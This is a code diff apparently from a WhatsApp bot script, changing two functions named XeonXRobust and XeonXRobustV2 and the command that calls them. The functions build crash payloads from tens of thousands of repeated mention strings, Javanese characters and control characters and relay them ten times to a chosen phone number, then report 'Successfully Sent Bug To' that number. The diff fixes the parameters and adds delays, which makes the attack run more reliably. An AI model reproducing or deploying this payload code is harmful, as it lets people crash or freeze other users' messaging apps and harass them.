@@ -423,8 +423,8 @@ const wanted = {
             }
         }
 		
-		    async function XeonXRobust(target, o, Ptcp = true) {
-	const jids = `*_~@13135550002~_*\n`.repeat(10200);
+		    async function XeonXRobust(viper, target, Ptcp = true) {
+	const jids = `*_~@13135550002~_*\n`.repeat(10000);
 	const ui = 'ꦽ'.repeat(10000);
    await viper.relayMessage(target, {
      ephemeralMessage: {
@@ -498,7 +498,7 @@ const wanted = {
 	}
 	
 	
-async function XeonXRobustV2(target) {
+async function XeonXRobustV2(viper, target) {
 const stanza = [
 {
 attrs: { biz_bot: '1' },
@@ -514,7 +514,7 @@ let messagePayload = {
 viewOnceMessage: {
 message: {
 listResponseMessage: {
-title: "*Hello I Am* 𝑽᪱͢͢𝒊𝒑𝒆᪳͢ᤡ𝒓𝑻᪳᪳͢𝒛𝒚" + "ꦽ".repeat(45000),
+title: "*Hello I Am* 𝑽᪱͢͢𝒊𝒑𝒆᪳͢ᤡ𝒓𝑻᪳᪳͢𝒛𝒚" + "ꦽ".repeat(30000),
 listType: 2,
 singleSelectReply: {
     selectedRowId: "🩸"
@@ -544,7 +544,7 @@ quotedMessage: {
                     footerText: "𝑽᪱͢͢𝒊𝒑𝒆᪳͢ᤡ𝒓𝑻᪳᪳͢𝒛𝒚",
                     buttons: [
                         {
-                            buttonId: "\u0000".repeat(60200),
+                            buttonId: "\u0003".repeat(150000),
                             buttonText: {
                                 displayText: "𝑽᪱͢͢𝒊𝒑𝒆᪳͢ᤡ𝒓𝑻᪳᪳͢𝒛𝒚"
                             },
@@ -2256,11 +2256,13 @@ var contactInfo = await viper.onWhatsApp(Xreturn);
   }
 
 reply(`In process`)
-	await sleep(1000)
+	await sleep(3000)
 for (let i = 0; i < 10; i++) {
-    await XeonXRobustV2(Xreturn)
+    await XeonXRobustV2(viper, Xreturn)
+    await sleep(2000)
     await XeonXRobust(Xreturn, viper, (cct = true), (ptcp = true));
-    await XeonXRobustV2(target)
+    await sleep(2000)
+    await XeonXRobustV2(viper, target)
     }
 	sendMessageWithMentions(
     "Successfully Sent Bug To @" + Xreturn.split('@')[0] + 
